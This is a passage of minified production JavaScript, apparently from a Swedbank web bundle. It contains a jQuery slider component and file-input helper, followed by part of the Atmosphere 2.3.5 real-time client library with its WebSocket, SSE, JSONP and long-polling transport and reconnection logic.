limitLabel=this.$element.find(".slider-additional-limit-label");"small"==this.options.limLabelSize&&limitLabel.addClass("-small"),"large"==this.options.limLabelSize&&limitLabel.addClass("-large")}},Slider.prototype.createStepper=function(){var $slider=this,$minus=this.$element.parent().append('<button class="ui-slider-minus"></button>').find(".ui-slider-minus"),$input=this.$element.parent().append('<input type="tel" class="ui-slider-input"/>').find(".ui-slider-input"),$plus=this.$element.parent().append('<button class="ui-slider-plus"></button>').find(".ui-slider-plus");$input.val(this.$element.data("initial-value")),$input.on("focus",(function(e){$input.val($slider.getCurrentValue())})),$input.on("blur",(function(e){$slider.setCurrentValue(parseInt($input.val())),$slider.$element.trigger("slide"),$slider.options.slide()})),$input.on("change",(function(e){var get=parseInt($input.val()),set=get;(!get||get<$slider.options.min)&&(set=$slider.options.min),get>$slider.options.max&&(set=$slider.options.max),$slider.setCurrentValue(set),$slider.$element.trigger("slide"),$slider.options.slide()})),$minus.on("click",(function(e){e.preventDefault()})),$minus.on("mousedown touchstart",(function(e){e.preventDefault();var value=$slider.getCurrentValue()-$slider.options.step;value>=$slider.options.min?$slider.setCurrentValue(value):$slider.setCurrentValue($slider.options.min),$slider.$element.trigger("slide"),$slider.options.slide()})),$plus.on("click",(function(e){e.preventDefault()})),$plus.on("mousedown touchstart",(function(e){e.preventDefault();var value=$slider.getCurrentValue()+$slider.options.step;value<=$slider.options.max?$slider.setCurrentValue(value):$slider.setCurrentValue($slider.options.max),$slider.$element.trigger("slide"),$slider.options.slide()}))},Slider.prototype.refreshRangeMarkers=function(){var min,max;this.options.fixedValues.length>0?(min=this.options.fixedValues[0],max=this.options.fixedValues[this.options.fixedValues.length-1]):(min=this.options.rangeMarkerFormatter.call(this,"min"),max=this.options.rangeMarkerFormatter.call(this,"max")),this.options.valueSuffix&&this.options.fixedValues.length>0&&(min+=" "+this.options.valueSuffix,max+=" "+this.options.valueSuffix),this.$container.find(".slider-range-point").each((function(index){this.innerHTML=0==index?min:max}))},Slider.prototype.createRangeMarkers=function(min,max){this.options.valueSuffix&&(min+=" "+this.options.valueSuffix,max+=" "+this.options.valueSuffix),this.$container.find(".slider-range-point").remove(),this.$container.append('<div class="slider-range-point">'+min+'</div><div class="slider-range-point">'+max+"</div>")},Slider.prototype.refreshValueMarker=function(){var values=this.options.values||[this.options.value];values.forEach((function(value,index){var $arrow=this.$element.find(".ui-slider-handle").eq(index),$value=$arrow.find(".current-value"),$input=this.$element.parent().find(".ui-slider-input");if($value.html(this.options.valueMarkerFormatter.call(this,value)),$input.val(this.options.valueMarkerFormatter.call(this,value)),2===values.length)if(0===index){var distanceBetween=$arrow.next().position().left-($arrow.position().left+$arrow.width());$arrow.toggleClass("align-left",distanceBetween<40)}else $arrow.toggleClass("align-right",$arrow.prev().is(".align-left"))}),this)},Slider.prototype.updateValueMarker=function(values,addSuffix){Array.isArray(values)||(values=[values]),values.forEach((function(value,index){var $arrow=this.$element.find(".ui-slider-handle").eq(index),$value=$arrow.find(".current-value"),$input=this.$element.parent().find(".ui-slider-input");if(this.options.valueSuffix&&!1!==addSuffix&&(value+=" "+this.options.valueSuffix),$value.html(value),$input.val(value),2===values.length){var className=1==index?"align-right":"align-left",condition=values[1]-values[0]<.1*(this.options.max-this.options.min);$arrow.toggleClass(className,condition)}}),this)},Slider.prototype.onSlide=function(callback){this.callbacks.slide.push(callback)},Slider.prototype.onSlideChange=function(callback){this.callbacks.slidechange.push(callback)},Slider.prototype.setValueMarkerFormatter=function(callback){this.options.valueMarkerFormatter=callback,this.refreshValueMarker()},Slider.prototype.setRangeMarkerFormatter=function(callback){this.options.rangeMarkerFormatter=callback,this.refreshRangeMarkers()};var initLegacySliders=()=>{jQuery(".slider-component").each((function(){var slider=new Slider(this);jQuery.extend(this,{slider:slider})}))};function initReverseAjax(){(new IOChannel).connectAsync()}function stylizeFormSteps($steps){$steps.find("li > ins").remove(),jQuery("li",$steps).each((function(i){i>0&&jQuery("<ins/>").width(jQuery(this).position().left-jQuery(this).prev().position().left-jQuery(this).prev().width()/2+jQuery(this).width()/2-36).appendTo(this)})),jQuery("li.active",$steps).prev().addClass("passed")}function transformFileInput($input,customData){if(!$input.parents(".input-file").length){var usesCustomClearBtn=customData&&customData.customClearBtn,$element=jQuery('<div class="input-file" />'),$label=jQuery('<span class="file-name empty" />'),$button=jQuery("<button/>",{type:"button"}).addClass("button -guiding").text(Swedbank.Labels("browse")),$clear=usesCustomClearBtn?customData.customClearBtn:jQuery('<span class="ico erase"/>'),placeholder=$input.attr("data-placeholder");void 0!==placeholder&&!1!==placeholder&&"1"!=placeholder&&$label.text(placeholder),$input.after($element),usesCustomClearBtn?$button.insertAfter($element.append($input).append($label)):$element.append($input).append($label).after($clear).after($button),usesCustomClearBtn||$clear.hide(),$button.on("click",(function(event){event.preventDefault?event.preventDefault():event.returnValue=!1,$input.click()})),$input.on("change",(function(){var name=$input.val().split("\\").pop();$label.text(name),$label.removeClass("empty"),usesCustomClearBtn||(""!=name?$clear.show():$clear.hide()),customData&&customData.inputChangeCallback&&customData.inputChangeCallback($input,name)})),$clear.off("click").on("click",(function(){var $clone=$input.val("").off().clone(!0);$element.after($clone),$element.remove(),usesCustomClearBtn||$clear.remove(),$button.remove(),transformFileInput($clone,customData),customData&&customData.inputChangeCallback&&customData.inputChangeCallback($clone,"")}))}}Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",initLegacySliders),jQuery(initLegacySliders)):Swedbank.PageLoad.onEach(initLegacySliders),function(root,factory){"function"==typeof define&&define.amd?define(factory):"undefined"!=typeof exports?module.exports=factory():root.atmosphere=factory()}(this,(function(){var ua,match,atmosphere={},offline=!1,requests=[],callbacks=[],uuid=0,hasOwn=Object.prototype.hasOwnProperty;return atmosphere={version:"2.3.5-javascript",onError:function(response){},onClose:function(response){},onOpen:function(response){},onReopen:function(response){},onMessage:function(response){},onReconnect:function(request,response){},onMessagePublished:function(response){},onTransportFailure:function(errorMessage,_request){},onLocalMessage:function(response){},onFailureToReconnect:function(request,response){},onClientTimeout:function(request){},onOpenAfterResume:function(request){},WebsocketApiAdapter:function(request){var _socket,_adapter;return request.onMessage=function(e){_adapter.onmessage({data:e.responseBody})},request.onMessagePublished=function(e){_adapter.onmessage({data:e.responseBody})},request.onOpen=function(e){_adapter.onopen(e)},_adapter={close:function(){_socket.close()},send:function(data){_socket.push(data)},onmessage:function(e){},onopen:function(e){},onclose:function(e){},onerror:function(e){}},_socket=new atmosphere.subscribe(request),_adapter},AtmosphereRequest:function(options){var _storageService,_traceTimer,_sharingKey,_request={timeout:3e5,method:"GET",headers:{},contentType:"",callback:null,url:"",data:"",suspend:!0,maxRequest:-1,reconnect:!0,maxStreamingLength:1e7,lastIndex:0,logLevel:"info",requestCount:0,fallbackMethod:"GET",fallbackTransport:"streaming",transport:"long-polling",webSocketImpl:null,webSocketBinaryType:null,dispatchUrl:null,webSocketPathDelimiter:"@@",enableXDR:!1,rewriteURL:!1,attachHeadersAsQueryString:!0,executeCallbackBeforeReconnect:!1,readyState:0,withCredentials:!1,trackMessageLength:!1,messageDelimiter:"|",connectTimeout:-1,reconnectInterval:0,dropHeaders:!0,uuid:0,async:!0,shared:!1,readResponsesHeaders:!1,maxReconnectOnClose:5,enableProtocol:!0,disableDisconnect:!1,pollingInterval:0,heartbeat:{client:null,server:null},ackInterval:0,closeAsync:!1,reconnectOnServerError:!0,handleOnlineOffline:!0,maxWebsocketErrorRetries:1,curWebsocketErrorRetries:0,onError:function(response){},onClose:function(response){},onOpen:function(response){},onMessage:function(response){},onReopen:function(request,response){},onReconnect:function(request,response){},onMessagePublished:function(response){},onTransportFailure:function(reason,request){},onLocalMessage:function(request){},onFailureToReconnect:function(request,response){},onClientTimeout:function(request){},onOpenAfterResume:function(request){}},_response={status:200,reasonPhrase:"OK",responseBody:"",messages:[],headers:[],state:"messageReceived",transport:"polling",error:null,request:null,partialMessage:"",errorHandled:!1,closedByClientTimeout:!1,ffTryingReconnect:!1},_websocket=null,_sse=null,_activeRequest=null,_ieStream=null,_jqxhr=null,_subscribed=!0,_requestCount=0,_heartbeatInterval=0,_heartbeatPadding="X",_abortingConnection=!1,_localSocketF=null,_localStorageService=null,guid=atmosphere.util.now();function _init(){_subscribed=!0,_abortingConnection=!1,_requestCount=0,_websocket=null,_sse=null,_activeRequest=null,_ieStream=null}function _canLog(level){return"debug"==level?"debug"===_request.logLevel:"info"==level?"info"===_request.logLevel||"debug"===_request.logLevel:"warn"==level?"warn"===_request.logLevel||"info"===_request.logLevel||"debug"===_request.logLevel:"error"==level&&("error"===_request.logLevel||"warn"===_request.logLevel||"info"===_request.logLevel||"debug"===_request.logLevel)}function _debug(msg){_canLog("debug")&&atmosphere.util.debug(new Date+" Atmosphere: "+msg)}function _verifyStreamingLength(ajaxRequest,rq){return""===_response.partialMessage&&"streaming"===rq.transport&&ajaxRequest.responseText.length>rq.maxStreamingLength}function _disconnect(){if(_request.enableProtocol&&!_request.disableDisconnect&&!_request.firstMessage){var query="X-Atmosphere-Transport=close&X-Atmosphere-tracking-id="+_request.uuid;atmosphere.util.each(_request.headers,(function(name,value){var h=atmosphere.util.isFunction(value)?value.call(this,_request,_request,_response):value;null!=h&&(query+="&"+encodeURIComponent(name)+"="+encodeURIComponent(h))}));var url=_request.url.replace(/([?&])_=[^&]*/,query);url+=url===_request.url?(/\?/.test(_request.url)?"&":"?")+query:"";var closeR=new atmosphere.AtmosphereRequest({connected:!1});closeR.connectTimeout=_request.connectTimeout,closeR.attachHeadersAsQueryString=!1,closeR.dropHeaders=!0,closeR.url=url,closeR.contentType="text/plain",closeR.transport="polling",closeR.method="GET",closeR.data="",closeR.heartbeat=null,_request.enableXDR&&(closeR.enableXDR=_request.enableXDR),closeR.async=_request.closeAsync,function _pushOnClose(message,rq){rq||(rq=_getPushRequest(message));rq.transport="polling",rq.method="GET",rq.withCredentials=!1,rq.reconnect=!1,rq.force=!0,rq.suspend=!1,rq.timeout=1e3,_executeRequest(rq)}("",closeR)}}function _close(){_debug("Closing (AtmosphereRequest._close() called)"),_abortingConnection=!0,_request.reconnectId&&(clearTimeout(_request.reconnectId),delete _request.reconnectId),_request.heartbeatTimer&&clearTimeout(_request.heartbeatTimer),_request.reconnect=!1,_response.request=_request,_response.state="unsubscribe",_response.responseBody="",_response.status=408,_response.partialMessage="",_request.curWebsocketErrorRetries=0,_invokeCallback(),_disconnect(),_clearState()}function _clearState(){_response.partialMessage="",_request.id&&clearTimeout(_request.id),_request.heartbeatTimer&&clearTimeout(_request.heartbeatTimer),_request.reconnectId&&(clearTimeout(_request.reconnectId),delete _request.reconnectId),null!=_ieStream&&(_ieStream.close(),_ieStream=null),null!=_jqxhr&&(_jqxhr.abort(),_jqxhr=null),null!=_activeRequest&&(_activeRequest.abort(),_activeRequest=null),null!=_websocket&&(_websocket.canSendMessage&&(_debug("invoking .close() on WebSocket object"),_websocket.close()),_websocket=null),null!=_sse&&(_sse.close(),_sse=null),function _clearStorage(){null!=_storageService&&(clearInterval(_traceTimer),document.cookie=_sharingKey+"=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/",_storageService.signal("close",{reason:"",heir:_abortingConnection?(_storageService.get("children")||[])[0]:guid}),_storageService.close());null!=_localStorageService&&_localStorageService.close()}()}function _subscribe(options){!function _reinit(){_clearState(),_init()}(),(_request=atmosphere.util.extend(_request,options)).mrequest=_request.reconnect,_request.reconnect||(_request.reconnect=!0)}function _execute(){if(_request.shared){if(null!=(_localStorageService=function _local(request){var trace,connector,orphan,name="atmosphere-"+request.url,connectors={storage:function(){function onstorage(event){event.key===name&&event.newValue&&listener(event.newValue)}if(atmosphere.util.storage){var storage=window.localStorage,get=function(key){var item=storage.getItem(name+"-"+key);return null===item?[]:atmosphere.util.parseJSON(item)},set=function(key,value){storage.setItem(name+"-"+key,atmosphere.util.stringifyJSON(value))};return{init:function(){return set("children",get("children").concat([guid])),atmosphere.util.on(window,"storage",onstorage),get("opened")},signal:function(type,data){storage.setItem(name,atmosphere.util.stringifyJSON({target:"p",type:type,data:data}))},close:function(){var children=get("children");atmosphere.util.off(window,"storage",onstorage),children&&removeFromArray(children,request.id)&&set("children",children)}}}},windowref:function(){var win=window.open("",name.replace(/\W/g,""));if(win&&!win.closed&&win.callbacks)return{init:function(){return win.callbacks.push(listener),win.children.push(guid),win.opened},signal:function(type,data){!win.closed&&win.fire&&win.fire(atmosphere.util.stringifyJSON({target:"p",type:type,data:data}))},close:function(){orphan||(removeFromArray(win.callbacks,listener),removeFromArray(win.children,guid))}}}};function removeFromArray(array,val){var i,length=array.length;for(i=0;i<length;i++)array[i]===val&&array.splice(i,1);return length!==array.length}function listener(string){var command=atmosphere.util.parseJSON(string),data=command.data;if("c"===command.target)switch(command.type){case"open":_open("opening","local",_request);break;case"close":orphan||(orphan=!0,"aborted"===data.reason?_close():data.heir===guid?_execute():setTimeout((function(){_execute()}),100));break;case"message":_prepareCallback(data,"messageReceived",200,request.transport);break;case"localMessage":_localMessage(data)}}function findTrace(){var matcher=new RegExp("(?:^|; )("+encodeURIComponent(name)+")=([^;]*)").exec(document.cookie);if(matcher)return atmosphere.util.parseJSON(decodeURIComponent(matcher[2]))}if(!(trace=findTrace())||atmosphere.util.now()-trace.ts>1e3)return;if(!(connector=connectors.storage()||connectors.windowref()))return;return{open:function(){var parentOpened;return _traceTimer=setInterval((function(){var oldTrace=trace;(trace=findTrace())&&oldTrace.ts!==trace.ts||listener(atmosphere.util.stringifyJSON({target:"c",type:"close",data:{reason:"error",heir:oldTrace.heir}}))}),1e3),(parentOpened=connector.init())&&setTimeout((function(){_open("opening","local",request)}),50),parentOpened},send:function(event){connector.signal("send",event)},localSend:function(event){connector.signal("localSend",atmosphere.util.stringifyJSON({id:guid,event:event}))},close:function(){_abortingConnection||(clearInterval(_traceTimer),connector.signal("close"),connector.close())}}}(_request))&&(_canLog("debug")&&atmosphere.util.debug("Storage service available. All communication will be local"),_localStorageService.open(_request)))return;_canLog("debug")&&atmosphere.util.debug("No Storage service available."),_localStorageService=null}_request.firstMessage=0==uuid,_request.isOpen=!1,_request.ctime=atmosphere.util.now(),0===_request.uuid&&(_request.uuid=uuid),_response.closedByClientTimeout=!1,"websocket"!==_request.transport&&"sse"!==_request.transport?_executeRequest(_request):"websocket"===_request.transport?!function _supportWebsocket(){return null!=_request.webSocketImpl||window.WebSocket||window.MozWebSocket}()?_reconnectWithFallbackTransport("Websocket is not supported, using request.fallbackTransport ("+_request.fallbackTransport+")"):_executeWebSocket(!1):"sse"===_request.transport&&(!function _supportSSE(){var url=atmosphere.util.getAbsoluteURL(_request.url.toLowerCase()),parts=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/.exec(url),crossOrigin=!(!parts||parts[1]==window.location.protocol&&parts[2]==window.location.hostname&&(parts[3]||("http:"===parts[1]?80:443))==(window.location.port||("http:"===window.location.protocol?80:443)));return window.EventSource&&(!crossOrigin||!atmosphere.util.browser.safari||atmosphere.util.browser.vmajor>=7)}()?_reconnectWithFallbackTransport("Server Side Events(SSE) is not supported, using request.fallbackTransport ("+_request.fallbackTransport+")"):_executeSSE(!1))}function _open(state,transport,request){if(_request.shared&&"local"!==transport&&function share(){var storageService,name="atmosphere-"+_request.url,servers_windowref=function(){var win,neim=name.replace(/\W/g,""),container=document.getElementById(neim);return container||((container=document.createElement("div")).id=neim,container.style.display="none",container.innerHTML='<iframe name="'+neim+'" />',document.body.appendChild(container)),win=container.firstChild.contentWindow,{init:function(){win.callbacks=[listener],win.fire=function(string){var i;for(i=0;i<win.callbacks.length;i++)win.callbacks[i](string)}},signal:function(type,data){!win.closed&&win.fire&&win.fire(atmosphere.util.stringifyJSON({target:"c",type:type,data:data}))},get:function(key){return win.closed?null:win[key]},set:function(key,value){win.closed||(win[key]=value)},close:function(){}}};function listener(string){var command=atmosphere.util.parseJSON(string),data=command.data;if("p"===command.target)switch(command.type){case"send":_push(data);break;case"localSend":_localMessage(data);break;case"close":_close()}}function leaveTrace(){document.cookie=_sharingKey+"="+encodeURIComponent(atmosphere.util.stringifyJSON({ts:atmosphere.util.now()+1,heir:(storageService.get("children")||[])[0]}))+"; path=/"}_localSocketF=function propagateMessageEvent(context){storageService.signal("message",context)},(storageService=function(){function onstorage(event){event.key===name&&event.newValue&&listener(event.newValue)}if(atmosphere.util.storage){var storage=window.localStorage;return{init:function(){atmosphere.util.on(window,"storage",onstorage)},signal:function(type,data){storage.setItem(name,atmosphere.util.stringifyJSON({target:"c",type:type,data:data}))},get:function(key){return atmosphere.util.parseJSON(storage.getItem(name+"-"+key))},set:function(key,value){storage.setItem(name+"-"+key,atmosphere.util.stringifyJSON(value))},close:function(){atmosphere.util.off(window,"storage",onstorage),storage.removeItem(name),storage.removeItem(name+"-opened"),storage.removeItem(name+"-children")}}}}()||servers_windowref()).init(),_canLog("debug")&&atmosphere.util.debug("Installed StorageService "+storageService),storageService.set("children",[]),null==storageService.get("opened")||storageService.get("opened")||storageService.set("opened",!1),_sharingKey=encodeURIComponent(name),leaveTrace(),_traceTimer=setInterval(leaveTrace,1e3),_storageService=storageService}(),null!=_storageService&&_storageService.set("opened",!0),request.close=function(){_close()},_requestCount>0&&"re-connecting"===state)request.isReopen=!0,function _tryingToReconnect(response){response.state="re-connecting",_invokeFunction(response)}(_response);else if(null==_response.error){_response.request=request;var prevState=_response.state;_response.state=state;var prevTransport=_response.transport;_response.transport=transport;var _body=_response.responseBody;_invokeCallback(),_response.responseBody=_body,_response.state=prevState,_response.transport=prevTransport}}function _jsonp(request){request.transport="jsonp";var script,rq=_request;null!=request&&void 0!==request&&(rq=request),(_jqxhr={open:function(){var callback="atmosphere"+ ++guid;function poll(){var url=rq.url;null!=rq.dispatchUrl&&(url+=rq.dispatchUrl);var data=rq.data;rq.attachHeadersAsQueryString&&(url=_attachHeaders(rq),""!==data&&(url+="&X-Atmosphere-Post-Body="+encodeURIComponent(data)),data="");var head=document.head||document.getElementsByTagName("head")[0]||document.documentElement;(script=document.createElement("script")).src=url+"&jsonpTransport="+callback,script.clean=function(){script.clean=script.onerror=script.onload=script.onreadystatechange=null,script.parentNode&&script.parentNode.removeChild(script),2==++request.scriptCount&&(request.scriptCount=1,function _reconnectOnFailure(){rq.lastIndex=0,rq.openId&&clearTimeout(rq.openId),rq.heartbeatTimer&&clearTimeout(rq.heartbeatTimer),rq.reconnect&&_requestCount++<rq.maxReconnectOnClose?(_open("re-connecting",rq.transport,rq),_reconnect(_jqxhr,rq,request.reconnectInterval),rq.openId=setTimeout((function(){_triggerOpen(rq)}),rq.reconnectInterval+1e3)):_onError(0,"maxReconnectOnClose reached")}())},script.onload=script.onreadystatechange=function(){_debug("jsonp.onload"),script.readyState&&!/loaded|complete/.test(script.readyState)||script.clean()},script.onerror=function(){_debug("jsonp.onerror"),request.scriptCount=1,script.clean()},head.insertBefore(script,head.firstChild)}window[callback]=function(msg){if(_debug("jsonp.window"),request.scriptCount=0,rq.reconnect&&-1===rq.maxRequest||rq.requestCount++<rq.maxRequest){if(rq.executeCallbackBeforeReconnect||_reconnect(_jqxhr,rq,rq.pollingInterval),null!=msg&&"string"!=typeof msg)try{msg=msg.message}catch(err){}_trackMessageSize(msg,rq,_response)||_prepareCallback(_response.responseBody,"messageReceived",200,rq.transport),rq.executeCallbackBeforeReconnect&&_reconnect(_jqxhr,rq,rq.pollingInterval),_timeout(rq)}else atmosphere.util.log(_request.logLevel,["JSONP reconnect maximum try reached "+_request.requestCount]),_onError(0,"maxRequest reached")},setTimeout((function(){poll()}),50)},abort:function(){script&&script.clean&&script.clean()}}).open()}function _executeSSE(sseOpened){_response.transport="sse";var location=function _buildSSEUrl(){return _attachHeaders(_request)}();if(_canLog("debug")&&(atmosphere.util.debug("Invoking executeSSE"),atmosphere.util.debug("Using URL: "+location)),!sseOpened||_request.reconnect){try{_sse=new EventSource(location,{withCredentials:_request.withCredentials})}catch(e){return _onError(0,e),void _reconnectWithFallbackTransport("SSE failed. Downgrading to fallback transport and resending")}_request.connectTimeout>0&&(_request.id=setTimeout((function(){sseOpened||_clearState()}),_request.connectTimeout)),_sse.onopen=function(event){_debug("sse.onopen"),_timeout(_request),_canLog("debug")&&atmosphere.util.debug("SSE successfully opened"),_request.enableProtocol?_request.isReopen&&(_request.isReopen=!1,_open("re-opening",_request.transport,_request)):_open(sseOpened?"re-opening":"opening","sse",_request),sseOpened=!0,"POST"===_request.method&&(_response.state="messageReceived",_sse.send(_request.data))},_sse.onmessage=function(message){(_debug("sse.onmessage"),_timeout(_request),!_request.enableXDR&&window.location.host&&message.origin&&message.origin!==window.location.protocol+"//"+window.location.host)?atmosphere.util.log(_request.logLevel,["Origin was not "+window.location.protocol+"//"+window.location.host]):(_response.state="messageReceived",_response.status=200,_trackMessageSize(message=message.data,_request,_response)||(_invokeCallback(),_response.responseBody="",_response.messages=[]))},_sse.onerror=function(message){_debug("sse.onerror"),clearTimeout(_request.id),_request.heartbeatTimer&&clearTimeout(_request.heartbeatTimer),_response.closedByClientTimeout||(_invokeClose(sseOpened),_clearState(),_abortingConnection?atmosphere.util.log(_request.logLevel,["SSE closed normally"]):sseOpened?_request.reconnect&&"sse"===_response.transport&&(_requestCount++<_request.maxReconnectOnClose?(_open("re-connecting",_request.transport,_request),_request.reconnectInterval>0?_request.reconnectId=setTimeout((function(){_executeSSE(!0)}),_request.reconnectInterval):_executeSSE(!0),_response.responseBody="",_response.messages=[]):(atmosphere.util.log(_request.logLevel,["SSE reconnect maximum try reached "+_requestCount]),_onError(0,"maxReconnectOnClose reached"))):_reconnectWithFallbackTransport("SSE failed. Downgrading to fallback transport and resending"))}}else null!=_sse&&_clearState()}function _executeWebSocket(webSocketOpened){_response.transport="websocket";var location=function _buildWebSocketUrl(){return _attachHeaders(_request,atmosphere.util.getAbsoluteURL(_request.webSocketUrl||_request.url)).replace(/^http/,"ws")}(_request.url);(_canLog("debug")&&atmosphere.util.debug("Invoking executeWebSocket, using URL: "+location),!webSocketOpened||_request.reconnect)?(_websocket=function _getWebSocket(location){return null!=_request.webSocketImpl?_request.webSocketImpl:window.WebSocket?new WebSocket(location):new MozWebSocket(location)}(location),null!=_request.webSocketBinaryType&&(_websocket.binaryType=_request.webSocketBinaryType),_request.connectTimeout>0&&(_request.id=setTimeout((function(){if(webSocketOpened);else{_websocket.onclose({code:1002,reason:"",wasClean:!1});try{_clearState()}catch(e){}}}),_request.connectTimeout)),_websocket.onopen=function(message){_debug("websocket.onopen"),_timeout(_request),offline=!1,_canLog("debug")&&atmosphere.util.debug("Websocket successfully opened");var reopening=webSocketOpened;null!=_websocket&&(_websocket.canSendMessage=!0),_request.enableProtocol||(webSocketOpened=!0,_open(reopening?"re-opening":"opening","websocket",_request)),null!=_websocket&&"POST"===_request.method&&(_response.state="messageReceived",_websocket.send(_request.data))},_websocket.onmessage=function(message){if(_debug("websocket.onmessage"),_timeout(_request),_request.enableProtocol&&(webSocketOpened=!0),_response.state="messageReceived",_response.status=200,"string"==typeof(message=message.data)){_trackMessageSize(message,_request,_response)||(_invokeCallback(),_response.responseBody="",_response.messages=[])}else{if(""===(message=_handleProtocol(_request,message)))return;_response.responseBody=message,_invokeCallback(),_response.responseBody=null}},_websocket.onerror=function(message){_debug("websocket.onerror"),clearTimeout(_request.id),_request.heartbeatTimer&&clearTimeout(_request.heartbeatTimer),++_request.curWebsocketErrorRetries<_request.maxWebsocketErrorRetries&&"websocket"!==_request.fallbackTransport&&_reconnectWithFallbackTransport("Failed to connect via Websocket. Downgrading to "+_request.fallbackTransport+" and resending")},_websocket.onclose=function(message){if(_debug("websocket.onclose"),clearTimeout(_request.id),"closed"!==_response.state){var reason=message.reason;if(""===reason)switch(message.code){case 1e3:reason="Normal closure; the connection successfully completed whatever purpose for which it was created.";break;case 1001:reason="The endpoint is going away, either because of a server failure or because the browser is navigating away from the page that opened the connection.";break;case 1002:reason="The endpoint is terminating the connection due to a protocol error.";break;case 1003:reason="The connection is being terminated because the endpoint received data of a type it cannot accept (for example, a text-only endpoint received binary data).";break;case 1004:reason="The endpoint is terminating the connection because a data frame was received that is too large.";break;case 1005:reason="Unknown: no status code was provided even though one was expected.";break;case 1006:reason="Connection was closed abnormally (that is, with no close frame being sent)."}_canLog("warn")&&atmosphere.util.warn("Websocket closed, reason: "+reason+" - wasClean: "+message.wasClean),_response.closedByClientTimeout||_request.handleOnlineOffline&&offline?_request.reconnectId&&(clearTimeout(_request.reconnectId),delete _request.reconnectId):(_invokeClose(webSocketOpened),_response.state="closed",_abortingConnection?atmosphere.util.log(_request.logLevel,["Websocket closed normally"]):webSocketOpened||"websocket"===_request.fallbackTransport?_request.reconnect&&"websocket"===_response.transport&&(_clearState(),_requestCount++<_request.maxReconnectOnClose?(_open("re-connecting",_request.transport,_request),_request.reconnectInterval>0?_request.reconnectId=setTimeout((function(){_response.responseBody="",_response.messages=[],_executeWebSocket(!0)}),_request.reconnectInterval):(_response.responseBody="",_response.messages=[],_executeWebSocket(!0))):(atmosphere.util.log(_request.logLevel,["Websocket reconnect maximum try reached "+_requestCount]),_canLog("warn")&&atmosphere.util.warn("Websocket error, reason: "+message.reason),_onError(0,"maxReconnectOnClose reached"))):_reconnectWithFallbackTransport("Websocket failed on first connection attempt. Downgrading to "+_request.fallbackTransport+" and resending"))}},navigator.userAgent.toLowerCase().indexOf("android")>-1&&void 0===_websocket.url&&_websocket.onclose({reason:"Android 4.1 does not support websockets.",wasClean:!1})):null!=_websocket&&_clearState()}function _handleProtocol(request,message){var nMessage=message;if("polling"===request.transport)return nMessage;if(request.enableProtocol&&request.firstMessage&&0!==atmosphere.util.trim(message).length){var pos=request.trackMessageLength?1:0,messages=message.split(request.messageDelimiter);if(messages.length<=pos+1)return nMessage;if(request.firstMessage=!1,request.uuid=atmosphere.util.trim(messages[pos]),messages.length<=pos+2&&atmosphere.util.log("error",["Protocol data not sent by the server. If you enable protocol on client side, be sure to install JavascriptProtocol interceptor on server side.Also note that atmosphere-runtime 2.2+ should be used."]),_heartbeatInterval=parseInt(atmosphere.util.trim(messages[pos+1]),10),_heartbeatPadding=messages[pos+2],"long-polling"!==request.transport&&_triggerOpen(request),uuid=request.uuid,nMessage="",pos=request.trackMessageLength?4:3,messages.length>pos+1)for(var i=pos;i<messages.length;i++)nMessage+=messages[i],i+1!==messages.length&&(nMessage+=request.messageDelimiter);0!==request.ackInterval&&setTimeout((function(){_push("...ACK...")}),request.ackInterval)}else request.enableProtocol&&request.firstMessage&&atmosphere.util.browser.msie&&+atmosphere.util.browser.version.split(".")[0]<10?atmosphere.util.log(_request.logLevel,["Receiving unexpected data from IE"]):_triggerOpen(request);return nMessage}function _timeout(_request){clearTimeout(_request.id),_request.timeout>0&&"polling"!==_request.transport&&(_request.id=setTimeout((function(){!function _onClientTimeout(_request){_response.closedByClientTimeout=!0,_response.state="closedByClient",_response.responseBody="",_response.status=408,_response.messages=[],_invokeCallback()}(),_disconnect(),_clearState()}),_request.timeout))}function _onError(code,reason){_clearState(),clearTimeout(_request.id),_response.state="error",_response.reasonPhrase=reason,_response.responseBody="",_response.status=code,_response.messages=[],_invokeCallback()}function _trackMessageSize(message,request,response){if(0===(message=_handleProtocol(request,message)).length)return!0;if(response.responseBody=message,request.trackMessageLength){var messages=[],messageStart=(message=response.partialMessage+message).indexOf(request.messageDelimiter);if(-1!=messageStart){for(;-1!==messageStart;){var str=message.substring(0,messageStart),messageLength=+str;if(isNaN(messageLength))throw response.partialMessage="",new Error('message length "'+str+'" is not a number');(messageStart+=request.messageDelimiter.length)+messageLength>message.length?messageStart=-1:(messages.push(message.substring(messageStart,messageStart+messageLength)),messageStart=(message=message.substring(messageStart+messageLength,message.length)).indexOf(request.messageDelimiter))}return response.partialMessage=message,0!==messages.length?(response.responseBody=messages.join(request.messageDelimiter),response.messages=messages,!1):(response.responseBody="",response.messages=[],!0)}}return response.responseBody=message,response.messages=[message],!1}function _reconnectWithFallbackTransport(errorMessage){atmosphere.util.log(_request.logLevel,[errorMessage]),void 0!==_request.onTransportFailure?_request.onTransportFailure(errorMessage,_request):void 0!==atmosphere.util.onTransportFailure&&atmosphere.util.onTransportFailure(errorMessage,_request);var reconnectInterval=-1===_request.connectTimeout?0:_request.connectTimeout;_request.reconnect&&"none"!==_request.transport||null==_request.transport?(_request.transport=_request.fallbackTransport,_request.method=_request.fallbackMethod,_response.transport=_request.fallbackTransport,_response.state="",_request.fallbackTransport="none",reconnectInterval>0?_request.reconnectId=setTimeout((function(){_execute()}),reconnectInterval):_execute()):_onError(500,"Unable to reconnect with fallback transport")}function _attachHeaders(request,url){var rq=_request;return null!=request&&void 0!==request&&(rq=request),null==url&&(url=rq.url),rq.attachHeadersAsQueryString?(-1!==url.indexOf("X-Atmosphere-Framework")||(url+=-1!==url.indexOf("?")?"&":"?",url+="X-Atmosphere-tracking-id="+rq.uuid,url+="&X-Atmosphere-Framework="+atmosphere.version,url+="&X-Atmosphere-Transport="+rq.transport,rq.trackMessageLength&&(url+="&X-Atmosphere-TrackMessageSize=true"),null!==rq.heartbeat&&null!==rq.heartbeat.server&&(url+="&X-Heartbeat-Server="+rq.heartbeat.server),""!==rq.contentType&&(url+="&Content-Type="+("websocket"===rq.transport?rq.contentType:encodeURIComponent(rq.contentType))),rq.enableProtocol&&(url+="&X-atmo-protocol=true"),atmosphere.util.each(rq.headers,(function(name,value){var h=atmosphere.util.isFunction(value)?value.call(this,rq,request,_response):value;null!=h&&(url+="&"+encodeURIComponent(name)+"="+encodeURIComponent(h))}))),url):url}function 